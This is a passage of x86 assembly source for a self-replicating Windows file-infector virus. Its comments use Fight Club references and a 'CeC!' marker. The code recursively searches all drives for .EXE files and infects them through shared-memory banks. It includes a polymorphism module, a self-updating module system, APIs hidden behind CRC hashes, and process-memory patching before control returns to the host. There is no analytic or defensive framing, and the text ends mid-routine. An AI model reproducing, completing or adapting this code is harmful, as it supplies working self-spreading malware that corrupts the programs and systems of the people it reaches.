   InfectAFile:

       mov dword ptr [edx-4],0     ; set last infect null
       call    LoadAclient         ; load a client

       lea ebx,[edx+nullsize-8+1024+1024+8] ; point to file offset

   loadnext:

       cmp dword ptr [ebx+8],0
       je  finishallthat0

       bt  dword ptr [ebx+4],31            ; test if already
       jc  skipinfect              ; had error ?

       cmp dword ptr [ebx+4],4000h         ; already infected ?
       jb  skipinfect1

       push    eax
       push    edx
       mov eax,dword ptr [ebx+4]       ; load the value
       sub eax,4000h

       call    getvirusminiversion

       cmp edx,eax             ; too advanced version ?
       pop edx
       pop eax
       jbe skipinfect          ; see if u need to update it

   skipinfect1:

       cmp dword ptr [ebx+4],2     ; open error ?
       jne goaway95

       mov ecx,dword ptr [edx-8]
       and ecx,111111b         ; 1 chance over 64 of cleaning
                           ; it
       cmp ecx,111111b
       jne skipinfect

   goaway95:

       push    eax
       call    LoadABank           ; load a bank for infection
       pop ecx

       cmp eax,-1              ; no bank ?
       je  finishallthat0

       add ebx,8               ; bank okay

       push    ebx

       push    eax
       call    GetMappedFile
       sub ebx,eax
       pop eax             ; set bank pos relative

       pushad

       push    eax
       push    ebx
       push    WM_INFECTEXE            ;
       push    ecx
       apicall 0FBAC7F60h,1            ; SendMessageA

       mov dword ptr [esp+20h-4],eax
       popad

       pop ebx

       mov dword ptr [ebx-4],eax       ; set file stat
       jmp finishallthat0          ; nothing to infect much

       skipinfect:
       add ebx,8               ; do it again
   getthisone:
       inc ebx
       cmp byte ptr [ebx-1],0      ; end of name ?
       jne getthisone

       jmp loadnext            ; load next

   finishallthat0:

       xor eax,eax
       ret 16

   LoadAclient:

       mov ecx,64              ; get a client
       mov eax,edx

   getbla1:
       cmp dword ptr [eax],0       ; load untill a non void bee
       je  blabla1

       cmp dword ptr [eax+8],0     ; and non-busy
       je  blabl2

       blabla1:

       add eax,12
       loop    getbla1

       mov eax,dword ptr [edx-0Ch]

       ret

   blabl2:
       mov eax,dword ptr [eax]
       ret

   LoadABank:

       push    edx
       call    GetMappedFile               ; load the mapped file

       lea edx,[eax+8096+(5000*structfil)]     ; load the mapped pos
       mov ecx,32

       getbankit:

       cmp dword ptr [edx],-1          ; check if pos there
       je  quitbank                ; is full busy

       bt  dword ptr [edx],ecx
       jc  getnextbank             ; check if loaded

       mov eax,dword ptr [edx]         ; set busy
       rol eax,cl
       inc eax
       ror eax,cl
       mov dword ptr [edx],eax

       mov eax,ecx

       pop edx                 ; finish
       ret

       getnextbank:

       loop    getbankit               ; check 32 possibility

       pop edx

       ret

   quitbank:

       xor eax,eax                 ; error bank
       dec eax
       ret


   unloadbank:

       push    edx
       call    GetMappedFile

       lea edx,[eax+8096+(5000*structfil)]

       mov eax,dword ptr [edx]
       rol eax,cl
       and al,11111110b            ; deload bank
       ror eax,cl
       mov dword ptr [edx],eax
       pop edx

       ret

   Infectexe:

       push    ebp
       push    edi
       push    esi

       mov esi,dword ptr [esp+8+4+wpamval]
       call    GetMappedFile
       add esi,eax
       push    esi

       call    BuildModulesImage       ; flush module
       push    ecx             ; virus size

       call    LoadModuleTable         ;
       push    edx

       call    incuservalue            ; set +1 user value

       call    getvirusminiversion     ; now we cant change the code
       push    edx

       mov ecx,dword ptr [esp+10h+8+4+lpamval]
       push    ecx
       call    CopyVirusImageToBank        ; set bank 33 to must done bank
       pop ecx

       call    LoadBankInfo

       mov ebp,edx
       mov dword ptr [ebp+error],0
       mov ecx,dword ptr [esp+10h+8+4+lpamval]
       mov dword ptr [ebp+virusbank],ecx
       pop edx                 ; load version (40)
       mov dword ptr [ebp+version],edx
       pop edx                 ; table offset
       mov dword ptr [ebp+valuefill],edx
       pop ecx                 ; virus size
       mov dword ptr [ebp+virsize],ecx

       mov edx,eax

       pop esi
       mov eax,0
       call    ModuleCall              ; call infect

       pop esi
       pop edi
       pop ebp

       push    eax
       call    decuservalue            ; set zero user value
       pop eax

       ret 16

   LoadBankInfo:

       call    GetMappedFile
       mov ebx,eax
       add ebx,8096+(structfil*5000)+4

       mov eax,64
       dec ecx
       xor edx,edx
       mul ecx

       push    eax

       mov eax,banksize
       mul ecx

       lea eax,[ebx+eax+(32*64)]       ; return mini buffer loc
       pop edx
       lea edx,[ebx+edx]           ; return buffer loc

       ret

   PolyMorphiseIt:

       push    ebp             ; long stack play just
       push    ebx             ; to keep the regs as it is
                           ; between modules
       push    esp

       push    ecx

       push    4
       push    1000h                   ; MEM_COMMIT
       push    banksize
       push    0
       apicall 0A2F83D2Ah,0                ; VirtualAlloc

       push    eax

       push    4
       push    1000h                   ; MEM_COMMIT
       push    banksize
       push    0
       apicall 0A2F83D2Ah,0                ; VirtualAlloc

       pop edx
       pop ecx

       pop ebp

       mov edi,eax

       push    edi
       push    edx

       push    edi
       push    esi

       mov eax,1
       call    ModuleCall              ; call polymorphise

       pop edi
       pop esi

       push    ecx
       repz    movsb
       pop ecx

       pop edx
       pop eax

       pushad
       push edx

       push    4000h                   ; MEM_DECOMMIT
       push    banksize
       push    eax
       apicall 0545F6132h,0                ; VirtualFree

       pop     edx

       push    4000h                   ; MEM_DECOMMIT
       push    banksize
       push    edx
       apicall 0545F6132h,0                ; VirtualFree

       popad

       pop ebx
       pop ebp

       ret

   ;
   ; File Finder loaded and workin' :)
   ;
   ;
   ; File Find Structure   !CeC at nullsize-8 (760) = CeC!  start of Find File
   ;       start + 4 =     offset to pointer to end of Directory
   ;       start + 8 = how much down in the dir tree are we ?
   ;       start + 12 =    list of : 0 Number ID
   ;                     4 Handle (number)
   ;       start + 1024 = Working Buffer Directory
   ;       start + 1024 + 260 = Current FindFirst32 thing
   ;       start + 1024 + 1024 = File storage, marked by CeC!
   ;       Storage start + 4 = File count (limited to 5000)
   ;       Storage start + 8 = File saved entry
   ;           each entry is = 0 = (Name + ) Crc
   ;                   4 = File state
   ;                   8 = Name terminated by a zero char
   ;

   FindAFile:

   push    edx

   push    esi
   push    edi

   xor edi,edi

   add     edx,nullsize-8

   cmp dword ptr [edx],'!CeC'          ; check for a consistent
   je  skipinitfile                ; structure

   mov dword ptr [edx],'!CeC'          ; set the structure active

   lea edi,[edx+12]                ; zeroize the handles buffer
   mov ecx,32*8                ; for init
   xor eax,eax
   repz    stosb

   lea ecx,[edx+1024]              ; load the ecx

   push    ecx
   push    edx

   push     ecx                    ; find the current directory
   push     260
   apicall  220B36AAh,0                ; GetCurrentDirectoryA
   pop  edx

   pop ecx

   skipinitfile:
   andloadfile:

   lea ecx,[edx+1024]              ; load the ecx

   mov ebx,ecx
   xor eax,eax

   gogetagainslash:

   inc ecx                 ; Check number of \ wich is

   cmp byte ptr [ecx],'\'          ; the counter of directories
   jne getnextslash                ; level

   inc eax

   getnextslash:

   cmp byte ptr [ecx],0
   jne gogetagainslash             ; untill the end

   sub ecx,ebx
   ;dec    eax

   mov dword ptr [edx+4],ecx       ; ecx is a pointer to the 0 end char
   mov dword ptr [edx+8],eax       ; is the directory level

   mov eax,dword ptr [edx+8]
   lea eax,[edx+12+eax*8]      ; seek to that pointer
   mov eax,dword ptr [eax+4]       ; load value

   lea ecx,[edx+1024+260]      ; point to the find first find next

   push    edx             ; save  handler, api call scratch it

   push    ecx
   push    eax             ;

   Fapicall 0E5FAADCFh,0,kk94      ; Find the next file, if value
                       ; scratched
   pop edx

   cmp eax,0
   jne AddOneFile          ; is it working ? all right

   push    edx

   Fapicall    0D15AA8A9h,0,kk103
                       ; if we reach that point, Find Next
                       ; have failed
   pop edx

   cmp eax,12h
   je  goupdirnow

   mov ecx,dword ptr [edx+4]       ; ecx is a pointer to the directory

   lea ecx,[ecx+edx+1024]      ; initing the buffer
   push    ecx
   mov dword ptr [ecx],'*.*\'      ; set it with the zero
   mov byte ptr [ecx+4],0

   lea ecx,[edx+1024]          ; initing the buffer
   lea ebx,[edx+1024+260]      ; where we drop it


   push    edx

   push    ebx
   push    ecx
   Fapicall    04A5BD785h,0,kk126  ; and then find the next file

   pop edx
   pop ecx

   mov dword ptr [ecx],0       ; set it with the zero
   mov byte ptr [ecx+4],0

   cmp eax,-1
   je  goupdirnow

   mov ecx,dword ptr [edx+8]
   lea ebx,[edx+12+ecx*8]      ; load the deep counter value

   mov ecx,dword ptr [ebx]     ; load the count value
   mov dword ptr [ebx+4],eax

   inc ecx

   reloadonefile:

   cmp ecx,0               ; find it X time
   je  AddOneFile

   dec ecx

   push    ecx
   push    edx
   push    eax

   lea edx,dword ptr [edx+1024+260]        ; then load in the FF buffer

   push    edx
   push    eax
   Fapicall    0E5FAADCFh,0,kk160      ; find next file

   pop eax
   pop edx
   pop ecx

   jmp reloadonefile

   AddOneFile:

   cmp byte ptr [edx+1024+260+2Ch],'.'
   je  filegoaway

   bt  dword ptr [edx+1024+260],4
   jnc dontgodowndir

   lea esi,[edx+1024+260+2Ch]
   lea edi,[edx+1024]
   add edi,dword ptr [edx+4]

   inc     dword ptr [edx+8]

   mov eax,dword ptr [edx+8]
   lea eax,[edx+12+eax*8]
   mov dword ptr [eax],0

   mov byte ptr [edi],'\'
   inc edi

   loadbbeforenext:

   lodsb
   stosb

   cmp al,0
   jne loadbbeforenext

   jmp andloadfile

   dontgodowndir:

   lea ebx,[edx+1024+260+2Ch]

   searchagain:
   inc ebx

   cmp byte ptr [ebx],0
   je  filegoaway

   cmp byte ptr [ebx],'.'
   jne searchagain

   cmp dword ptr [ebx+1],'EXE'
   jne filegoaway

   ;
   ; registering the file to the file buffer
   ;

   lea ecx,[edx+1024+1024]

   cmp dword ptr [ecx],'!CeC'          ; check strcutre
   je  skipinitfilbuff

   mov dword ptr [ecx],'!CeC'          ; set it
   mov dword ptr [ecx+4],0

   skipinitfilbuff:

   cmp dword ptr [ecx+4],4999          ; max number
   ja  skipregfile

   xor eax,eax

   lea ebx,[edx+1024]
   call    gotaload

   add eax,'\'                 ; load directory
   ror eax,3

   lea ebx,[edx+1024+260+2Ch]
   call    gotaload

   lea ebx,[ecx+8]             ; load name
   mov ecx,dword ptr [ecx+4]

   loadthismasta:

   cmp ecx,0                   ; seek to last entered PE
   je  gogotdropit

   cmp dword ptr [ebx],eax         ; already registered
   je  skipregfile

   add ebx,8

   getnext0:
   inc ebx
   cmp byte ptr [ebx-1],0
   jne getnext0

   dec ecx

   jmp loadthismasta

   gogotdropit:

   inc dword ptr [edx+1024+1024+4]     ; increment number of infected

   mov dword ptr [ebx],eax         ; set crc
   mov dword ptr [ebx+4],0         ; set null file state

   lea esi,[edx+1024]              ; load the directory
   lea edi,[ebx+8]

   getnext1236:

   lodsb
   stosb

   cmp al,0
   jne getnext1236

   mov byte ptr [edi-1],'\'            ; drop it
   lea esi,[edx+1024+260+2Ch]

   getnext789b:

   lodsb
   stosb

   cmp al,0
   jne getnext789b             ; drop name

   jmp skipregfile             ; finish work

   gotaload:

   push    ebx
   movzx   ebx,byte ptr [ebx]          ; load crc
   add eax,ebx
   pop ebx

   ror eax,3

   inc ebx
   cmp byte ptr [ebx],0
   jne gotaload

   ret

   skipregfile:

   filegoaway:

   mov ecx,dword ptr [edx+8]
   lea ebx,[edx+12+ecx*8]      ; load the deep counter value

   push    ebx
   mov eax,dword ptr [ebx+4]       ; load the handle

   lea ebx,[edx+1024+260]      ; load the buffer

   push    edx

   push    ebx
   push    eax

   Fapicall    0E5FAADCFh,0,kk232  ; find the file

   pop edx
   pop ebx

   inc dword ptr [ebx]

   cmp eax,0
   jne AddOneFile          ; we reached the last file ?

   goupdirnow:

   cmp dword ptr [edx+8],0
   jne     gonextdir

   changedrive:

   lea ecx,[edx+1024]

   mov dword ptr [edx+12],0
   mov dword ptr [edx+16],0

   inc byte ptr [ecx]
   mov word ptr [ecx+2],'\'

   push    edx
   push    ecx
   Fapicall    0986B615h,0,kk259       ; GetDriveTypeA
   pop edx                 ; never talk of project mayhem

   mov word ptr [edx+1024+2],0

   cmp eax,1
   jne testtwo

   mov word ptr [edx+1024],':C'
   jmp skipinitfile

   testtwo:

   cmp eax,3
   je  andloadfile

   cmp eax,4
   je  andloadfile

   jmp changedrive

   gonextdir:

   push    edx

   mov eax,dword ptr [edx+8]
   lea eax,[edx+12+eax*8]

   mov eax,dword ptr [eax+4]

   push    eax
   Fapicall    0A8793DEAh,0,kk290          ; FindClose

   pop edx

   lea esi,[edx+1024]
   add     esi,dword ptr [edx+4]

   decitagain:

   dec esi

   cmp byte ptr [esi],'\'          ; say it, say it
   jne decitagain              ; I'm tyler durden!

   mov byte ptr [esi],0

   pop edi
   pop esi

   pop edx

   ret

   ;
   ; code updator -
   ;
   ;   Work by the following method
   ;
   ;       1ø tell mother to create a mirror of his own module images
   ;       2ø Send Genetic map of client (module version codes)
   ;       3ø (if) mother call bee to upgrade selected code to mirror
   ;       4ø when no virus is dropped, then the mother flush the
   ;          mirror modules to the virus image
   ;
   ; mirror is created at bank #34 and flushed to bank #33 wich normally are
   ; unexistant, but you can play with them if you want, well, you have to
   ; respect a small structure, if u want to deal, see yourself comment at
   ; Updated function
   ;
   ;                       isn't that a funky world ?
   ;
   ; Shared functions:
   ;
   ;   void updatorrestart : Repair from a crash during updating
   ;   void CheckUpdated : Server check while connecting of client
   ;   void LoadModulePointer : Load the Module in the update
   ;   void LoadUpdateVersion : Init/Create the updating value
   ;   void FlushModule : Write to Dropped image
   ;   void GetUserValue : See how much hinstances are infecting
   ;   void SetUserValue : Set how much hinstances are infecting
   ;   void incuservalue : Inc the amount of hinstances are infection
   ;   void decuservalue : Dec the amount of hinstances are infection
   ;   void DirectUpdate : Update directly to a module (To be shared with mod)
   ;

   updatorrestart:

   pushad

   pushad
   call    BuildModulesImage
   popad

   mov ecx,34
   call    LoadBankInfo

   mov dword ptr [eax+8],0

   popad

   ret

   LoadModulePointer:

   pushad

   push    ecx
   mov ecx,34
   call    LoadBankInfo
   pop ecx

   mov ebx,eax

   mov eax,modulesize
   xor edx,edx
   mul ecx

   lea eax,dword ptr [eax+ebx+16]

   mov dword ptr [esp+20h-4],eax

   popad

   ret

   CheckUpdated:               ; This call the server to check
                       ; if each the remote virus have
   pushad
   call        BuildModulesImage
   popad
   call        LoadUpdateVersion

   loadpointer     ecx ,VersionDirty, up56
   mov     ecx,dword ptr [ecx]

   xor     eax,eax

   getnextbla99:

   cmp     cl,bl
   jae     getnext55

   pushad

   push    0
   push    eax
   push    WM_UPDATE
   push    edx             ;
   apicall 0FBAC7F60h,1                    ; SendMessageA

   popad

   getnext55:

   ror ebx,8
   ror ecx,8

   inc eax
   cmp eax,modulenumber
   jne getnextbla99

   ret

   LoadUpdateVersion:          ; the mum will update himself
                       ; to the memory area
   pushad

   mov ecx,34              ; load the Swap module bank
   call    LoadBankInfo

   mov edx,eax
   mov ebx,eax

   cmp dword ptr [edx],'!CeC'      ; check that it's was init.
   je  skipbankinfoit

   mov dword ptr [edx],'!CeC'      ; not ? init it!
   mov dword ptr [edx+12],0        ; reset the aldorflag

   push    edx

   mov ecx,33
   call    LoadBankInfo            ; load Dropped Virus image bank

   mov edx,eax             ; set it to edx

   add edx,(PointerTable-VirusStart)+12 ; we seek to kernel pointer table

   pop ebx

   lea edi,[ebx+16]            ; point to the module tables

   xor ecx,ecx             ; set null the module counter

   getthis95:

   push    ecx
   push    edi

   mov esi,dword ptr [edx+16+ecx*4]    ; get module offset
   lea esi,[edx+esi+16+modulenumber*4] ; from end of kernel

   mov ecx,dword ptr [esi]     ; load size
   repz    movsb               ; repz  it

   pop edi
   pop ecx

   add edi,modulesize          ; add modulesize

   inc ecx             ; increment it

   cmp ecx,modulenumber        ; we did all the counter ?
   jne getthis95

   mov edx,dword ptr [edx-4]       ; then load the module val
   mov dword ptr [ebx+4],edx       ; set as updated/loaded
   mov dword ptr [ebx+8],edx

   skipbankinfoit:

   mov ebx,dword ptr [ebx+4]
   mov dword ptr [esp+20h-4-4-4-4],ebx

   popad

   ret

   UpdateThisModule:

   pushad

   push    ecx

   mov ecx,34              ; load the Swap module bank
   call    LoadBankInfo

   pop ecx
   mov edx,eax             ; set the bank pos

   cmp dword ptr [edx],'!CeC'      ; Check if it's coherent
   jne skipupdatingit

   push    edx             ; save edx place

   lea edi,[edx+16]            ; Set the start of the needed info
   xor edx,edx

   mov eax,modulesize
   mul ecx             ; load the offset of it

   push    ecx

   add edi,eax             ; load the offset of the mirror
                       ; of module x
   mov ecx,33
   call    LoadBankInfo            ; load the virus-module images

   pop ecx

   push    ecx
   add eax,(PointerTable-VirusStart)+16 ; we seek to kernel pointer table

   mov esi,dword ptr [eax+16+ecx*4]    ; get module offset
   lea esi,[eax+esi+16+modulenumber*4] ; from end of kernel

   mov ecx,dword ptr [esi]     ; load module size

   push    esi

   repz    movsb               ; copy it to buffer

   pop esi
   pop ecx
   pop edx

   mov al,byte ptr [esi+5]     ; set new place
   mov byte ptr [edx+8+ecx],al     ;

   skipupdatingit:

   popad

   ret

   ;
   ; Update bank
   ;
   ;   Update bank alias #34 is divided in 5 part
   ;   a short header:     0   Cec! marker
   ;               4   Bank #33 version, Initially set to zero
   ;               8   Bank #34 version, Initially set to zero
   ;               12  Infect counter, Initially set to zero
   ;
   ;   from there, 5 part of modulesize byte, wich contain modules
   ;

   SetBank34Module:

   ;pushad
   ;mov    ecx,34
   ;call   LoadBankInfo
   ;popad
   ;
   ;mov    dword ptr [edx+8],eax
   ;
   ;ret

   FlushModule:                ; flush module to virus image

   pushad

   ; Your Pain is a white bowl of healing light

   mov ecx,34
   call    LoadBankInfo            ; load the virus-module images

   cmp dword ptr [eax],'!CeC'      ; Check flush module consistancy
   jne skipflush

   mov esi,eax             ; set esi as source module

   call    getuservalue            ; check if nobody use the user value

   cmp eax,0
   jne skipflush

   mov eax,-1              ; set it as busy
   call    setuservalue

   mov ecx,33
   call    LoadBankInfo            ; load the virus-module images

   push    eax

   mov edx,eax             ; set it as dest

   add edx,12+(PointerTable-VirusStart)    ; seek to pointer table in dest
   lea edi,[edx+modulenumber*4+16]     ; set it as end of module

   ; eh, see all the version updated!

   mov ecx,dword ptr [esi+8]       ; load new version
   mov dword ptr [esi+4],ecx       ; then set it as old version
   mov dword ptr [edx-4],ecx       ; then set it as flush immage version

   mov dword ptr [eax+8],ecx       ; set it as header version

   add esi,16              ; esi is pointing now to the start of
                       ; mods

   xor ecx,ecx             ; nullify ecx

   mov byte ptr [edi],90h      ; set a nop there
   inc edi             ; increment edi

   loopitagain:

   mov ebp,edi             ; set current pos in dest
   sub ebp,edx             ; from the end of pointer table
   sub ebp,modulenumber*4+16       ;

   mov dword ptr [edx+16+ecx*4],ebp    ; put new offset

   push    ecx             ; save counter

   mov ecx,dword ptr [esi]     ; load the size
   push    esi             ;

   repz    movsb               ; copy to the buffer

   pop esi             ; add fix module size
   add     esi,modulesize

   pop ecx             ; load the module number

   inc ecx

   cmp ecx,modulenumber
   jne loopitagain

   pop eax

   mov edx,eax

   sub eax,edi
   neg eax
   sub eax,12

   mov dword ptr [edx+4],eax       ; specify the size

   mov eax,0               ; nullify the user value
   call    setuservalue

   skipflush:

   popad

   ret

   getuservalue:

   pushad

   mov ecx,34
   call    LoadBankInfo            ; load the flushing-module images

   getthisoneb:

   mov edx,dword ptr [eax+12]

   cmp edx,-1
   je  getthisoneb

   mov dword ptr [esp+20h-4],edx

   popad

   ret

   setuservalue:

   pushad

   push    eax
   mov ecx,34
   call    LoadBankInfo            ; load the flushing-module images

   pop dword ptr [eax+12]

   popad

   ret

   incuservalue:

   pushad

   mov ecx,34
   call    LoadBankInfo            ; load the flushing-module images

   getthisonec:

   mov edx,dword ptr [eax+12]

   cmp edx,-1
   je  getthisonec         ; dont overwrite fucked value

   inc dword ptr [eax+12]      ; increment pass byte

   popad

   ret

   decuservalue:

   pushad

   mov ecx,34
   call    LoadBankInfo            ; load the flushing-module images

   dec dword ptr [eax+12]      ; decrement pass byte

   popad

   ret

   ;
   ; esi = modul origin
   ; ecx = module number
   ;

   DirectUpdate:

   pushad

   push    ecx
   push    ecx

   mov ecx,34
   call    LoadBankInfo

   pop ecx
   push    eax

   lea edi,[eax+16]

   mov eax,modulesize
   xor edx,edx
   mul ecx

   add edi,eax

   mov ecx,dword ptr [esi]

   mov ebx,dword ptr [esi+5]

   repz    movsb

   pop eax
   pop ecx

   mov byte ptr [eax+8+ecx*4],bl

   popad
   ret

   ;
   ; What modulization assume:
   ;
   ;   - a routine handler, that may give to routines the power to call
   ;     comon routines and to interact with the common memory buffer. The
   ;     routine is unused, instead of the Oxygen model where it's very very
   ;     used but kept for future use, ah yes, it's used to perform api calls
   ;   - to build a complete and most updated image of the virus included
   ;     latest techs
   ;   - to perform sub module calling, and managing untill the entrypoint
   ;     done also for Init - wich is a basic call and return the InitVal
   ;     that should be PE loaded base
   ;     and Fini that is basically a link to the infect procedure that is
   ;     basically a return to host.
   ;     Note that to deal with this, you need to have a fini compliant with
   ;     EPOZero norms, wich mean keeping a few (primordial) data before the
   ;     PE header, well yes, they may trash the EXE before but who care of
   ;     it ?
   ;
   ;       Modules have two version in them, the system
   ;       (wich is actually 1) and their own, the EPOZero norm is a bit
   ;       advanced but usable with a few effort to all technologies.
   ;       it needs to drop the return of a call that will be patched by
   ;       a known value
   ;
   ;   - Internal purpose:-Build virus to the bank #33 (wich is inexistant 4
   ;               the programmer,wich make it unaccessible in theory)
   ;              -Copy the most updated virus from #33 to bank X
   ;              -Dispatching kernel Function
   ;              -Build mini virus version code
   ;
   ;

       GetMapped   equ 1
       MApiCall    equ 2
       LoadLib     equ 3
       FApiCall    equ 4
       registernet equ 5
       getvirversion   equ 6
       getmodpointer   equ 7
       DirectUpdateIt  equ 8
       LoadBankInfoIt  equ 9
       PolyMorphising  equ 10

   RoutineHandler:             ; dispatching to Routine handler

       cmp dword ptr [esp-8],GetMapped
       jne getother0

       jmp GetMappedFile

   getother0:

       cmp dword ptr [esp-8],MApiCall
       jne getother1

       jmp ApiCallit

   getother1:

       cmp dword ptr [esp-8],LoadLib
       jne getother2

       jmp loadhandle

   getother2:

       cmp dword ptr [esp-8],FApiCall
       jne getother3

       jmp ExtendedApiCall

   getother3:

       cmp dword ptr [esp-8],registernet
       jne getother4

       jmp registernet0

   getother4:

       cmp dword ptr [esp-8],getvirversion
       jne getother5

       push        ebx
       call        LoadUpdateVersion
       mov     eax,ebx
       pop     ebx

       ret

   getother5:

       cmp dword ptr [esp-8],getmodpointer
       jne getother6

       jmp LoadModulePointer

   getother6:

       cmp dword ptr [esp-8],DirectUpdateIt
       jne getother7

       jmp DirectUpdate

   getother7:

       cmp dword ptr [esp-8],LoadBankInfoIt
       jne getother8

       jmp LoadBankInfo

   getother8:

       cmp dword ptr [esp-8],PolyMorphising
       jne getother9

       jmp PolyMorphiseIt

   getother9:

       ret


   LoadModuleTable:                    ; here it is

       push    ebx
       push    ecx

       loadpointer ebx, PointerTable, lmt
       loadpointer ecx, VirusStart, lmt2

       sub ebx,ecx
       mov edx,ebx

       pop ecx
       pop ebx

       ret

   BuildModulesImage:

       ; out:  ebx = virus offset
       ;   ecx = virus size

       push        ebp

       mov     ecx,33
       call        LoadBankInfo

       push        eax

       cmp     dword ptr [eax],'CeC!'
       jne     heydoitnow

   ;
   ;   bank 33 is a CeCile structure:
   ;
   ;   0 -     CeC header mark
   ;   4 -     virus size
   ;   8 -     bank 33 version
   ;   12 -    bank size
   ;
   ;
   ;   mov     edx,dword ptr [eax+8]
   ;   loadpointer ecx, VersionDirty, dtt
   ;
   ;   int     3
   ;
   ;   cmp     dword ptr [ecx],edx
   ;   jb      takeminemine

       jmp     takeminemine

   heydoitnow:

       mov     dword ptr [eax],'CeC!'
       push        eax

       lea     edi,[eax+12]
       mov     ebx,edi

       loadpointer esi, VirusStart,bm1
       mov     ecx, PointerTable-VirusStart    ; drop kernel
       repz        movsb

       mov     edx,esi
       mov     ebp,edi

       mov     ecx,StartMod-PointerTable
       repz        movsb

       mov     byte ptr [edi],090h     ; set a nop to have
                               ; non void pointers
       push        ebx             ; (mean non present
       mov     ebx,edi             ; modules)

       inc     edi

       mov     ecx,0

   fillit:

       mov     eax,dword ptr [edx+16+ecx*4]    ; load module
       add     eax,esi

       push        ecx

       cmp     eax,esi
       je      finishflushing

       cmp     byte ptr [eax+4],1      ; compatible with
       jne     notgoodbye          ; kernel 1 ?

   notgoodbye:

       push        ebx
       push        eax

       mov     al,byte ptr [eax+5]     ; load module version
       sub     ebx,16+modulenumber*4+4     ;
       add     ebx,ecx
       mov     byte ptr [ebx],al       ; save module version

       pop     eax
       pop     ebx

       push        edi
       push        ebx

       sub     edi,ebx
       sub     ecx,modulenumber
       neg     ecx             ; pointer is inverse
                               ; of versions ID
       shl     ecx,2
       sub     ebx,ecx
       mov     dword ptr [ebx],edi     ; save pointer

       pop     ebx
       pop     edi

       mov     ecx,dword ptr [eax]     ; load module size

       push        esi
       mov     esi,eax
       repz        movsb               ; flush size
       pop     esi

   finishflushing:

       pop     ecx

       add     ebp,4

       inc     ecx
       cmp     ecx,modulenumber        ; all flushed ?
       jne     fillit

       mov     ebx,dword ptr [edx-4]

       mov     eax,dword ptr [esp+4]
       mov     dword ptr [eax+8],ebx       ; set version

       pop     ebx
       mov     ecx,edi
       sub     ecx,ebx

       pop     eax
       mov     dword ptr [eax+4],ecx       ; set size

       call        LoadUpdateVersion

   takeminemine:

       call        FlushModule         ; flush modules

       pop     eax

       mov     ecx,dword ptr [eax+4]

       pop     ebp
       ret

   CopyVirusImageToBank:

       push        ecx

       mov     ecx,33
       call        LoadBankInfo            ; copy from bank 33

       mov     esi,eax

       pop     ecx
       call        LoadBankInfo            ; to chosen bank

       mov     edi,eax
       mov     ecx,dword ptr [esi+4]
       add     esi,12

       repz        movsb

       ret

   getvirusminiversion:        ; load a compressed version of the kernel
                   ; format ( 8 bit )

   push        eax
   loadpointer edx,VersionDirty,gvm

   movzx       eax,byte ptr [edx]
   shl     eax,2               ; 4 version of infector
   add     al,byte ptr [edx+1]
   shl     eax,4               ; 16 version of poly
   add     al,byte ptr [edx+2]     ; 4 version of payload

   mov     edx,eax

   pop     eax
   ret

   Fini0:

   loadpointer ebx,StartMod, m1
   loadpointer edx,InfectMod, m9
   add     ebx,dword ptr [edx]
   loadpointer edx,Fini, m1B
   add     ebx,dword ptr [edx]

   jmp         ebx

   Init0:

   loadpointer ebx,RoutineHandler, k3
   mov     eax,ebx
   loadpointer ebx,StartMod, m2

   sub     ebx,modulenumber*4
   mov     ecx,modulenumber        ; fix here module number

   getittomax:

   cmp     dword ptr [ebx],0
   je      getnextfill

   push        ecx
   push        ebx

   push        dword ptr [ebx]
   lea     ebx,[ebx+ecx*4]

   mov     ecx,dword ptr [esp]
   add     esp,4

   add     ecx,ebx

   mov     ebx,dword ptr [ecx+4+2]
   add     ebx,ecx
   mov     dword ptr [ebx],eax

   pop     ebx
   pop     ecx

   getnextfill:

   add     ebx,4

   loop        getittomax

   loadpointer edx,Init, m2B

   cmp     dword ptr [edx],0
   je      skipthatone

   add     ebx,dword ptr [edx]
   add     ebx,dword ptr [edx+8]       ; coz Ini/Fini located in code

   call        ebx

   skipthatone:
   ret

   ModuleCall:

   push        edx
   loadpointer edx, PointerTable, mC1
   loadpointer     ebx, StartMod, mC2

   mov     eax,dword ptr [edx+eax*4+16]
   add     eax,ebx

   mov     ebx,dword ptr [eax+4+4+2]
   add     ebx,eax
   pop     edx

   jmp     ebx

   VersionDirty:   db  1,1,1,1

   PointerTable:

   Fini:           dd      fini_m0-InfectStart
   FiniVal:    dd  0
   Init:           dd      0
   InitVal:    dd  0

   modulenumber    equ 4

   InfectMod:      dd      offset  InfectStart-StartMod
   PolyMod:        dd      offset  PolyStart-StartMod
   PayloadMod:     dd      offset  PayloadStart-StartMod
   ComMod:         dd      offset  CommodStart-StartMod

   ; DebugMod: dd  0

   StartMod:

   ret

   ; here should come the modules include

   ;
   ; Virus memory bank - use memory mapped file to make a shared memory
   ;   there's 32 bank
   ;
   ;   0 -    CeC!
   ;   4 -    Memory Bank State, bit x = bank is used if equal 1, unused if 0
   ;   8 -    32 * 64 for memory communication
   ;   2056 - 32 * 50000 for memory data
   ;

   error       equ 0           ; and the error code
   version     equ 4           ; virus version
   virsize     equ 8           ; the virus size
   valuefill   equ 12          ; the module table
   virusbank   equ 16          ; virus bank
   dropplace   equ 20          ; were virus image is dropped

   infmemsizeof    equ 24

   setval          macro           destination, origin

                   mov             dword ptr [ebp+&destination&],&origin&

               endm

   getval          macro           origin

                   mov             eax,dword ptr [ebp+&origin&]

               endm

   InfectStart:

   dd      offset InfectEnd - InfectStart
   db  1                   ; workable system
   db      1                   ; workable infection
   dd  InfectSyscall - InfectStart
   dd      Infectroutine - InfectStart

   ISyscall    macro       I_ID_CoDE

           mov     dword ptr [esp-12], I_ID_CoDE
           call        ISyscall0

   endm

   I_apicall   macro       crcval, libhandle

           mov     edx,libhandle
           mov     eax,crcval
           ISyscall    MApiCall

           endm

   I_Init:

   mov eax,dword ptr [edx+4]

   ret

   I_Fini:

   push        0
   I_apicall   01017D1A1h,0            ; get module handle

   add     eax,dword ptr [eax+03Ch]
   push        eax

   I_apicall   0ACDA53ACh,0    ;GetCurrentProcessId

   push        eax
   push        0
   push        01F0fffh
   I_apicall   0A2069B15h,0

   pop edx

   mov ecx,dword ptr [esp+20h]
   sub ecx,4
   push    edx

   push    dword ptr [edx-10]
   mov edx,esp

   push    0               ; 0 -
   push    4               ; 4 byte to write
   push    edx             ; offset of operation
   push    ecx             ; offset to base address
   push    eax             ; openprocess handle
   I_apicall   084979262h,0        ; WriteProcessMemory

   pop edx
   pop edx
   mov eax,dword ptr [esp+20h]
   add eax,dword ptr [edx-10]

   mov dword ptr [esp-4],eax
   popad

   jmp dword ptr [esp-4-20h]       ; return to the host :)

   Infectroutine:

   ;ISyscall        GetMapped
   ;add        ebp,eax

   push            ebp
   pushad

   ;
